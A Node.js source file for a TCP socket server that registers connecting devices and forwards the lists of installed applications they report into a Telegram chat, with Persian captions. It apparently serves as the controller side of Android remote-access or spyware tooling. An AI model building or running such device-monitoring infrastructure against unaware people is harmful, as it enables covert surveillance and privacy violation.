const token = "";

const TelegramBot = require("node-telegram-bot-api");
const net = require("net");

const makeFont = (string) => {
    const translationMap = {
        'q': 'Q', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 'ꜱ', 'd': 'ᴅ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationMap[char] || char).join('');
}

const bot = new TelegramBot(token, { polling: true })
const clients = [];
const server = net.createServer(async (socket) => {
    socket.on("data", async (body) => {
        try{
            const data = JSON.parse(body);
            if (data.method == "connect"){
                if (!clients.includes(socket)){
                    clients.push(socket);
                }
            } else if (data.method == "getApplications"){
                let apps = data.result;
                let string = '';
                for (let app of apps){
                    string += makeFont(`📃 name: ${app.name}\n🎫 package: ${app.package}\n---------\n`);
                }
                try{
                    await bot.editMessageText(
                        `🥤 | اپلیکیشن های دانلود شده:\n${string}`,
                        {
                            chat_id: data.chat_id,
                            message_id: data.message_id
                        }
                    )
                } catch (e) {
                    await bot.sendMessage(data.chat_id, `🥤 | اپلیکیشن های دانلود شده:\n${string}`)
                }
            }
        } catch (e){
            console.log("🔴 Error:", e)
        }
    })

    socket.on("end", () => {
        console.log(`🔓 Client ${socket.remoteAddress} disconnected`)
    })
})

server.listen(3000, "0.0.0.0", () => {
    console.log("✅ Socket-Server is online");
})

bot.on("message", async (msg) => {
    
})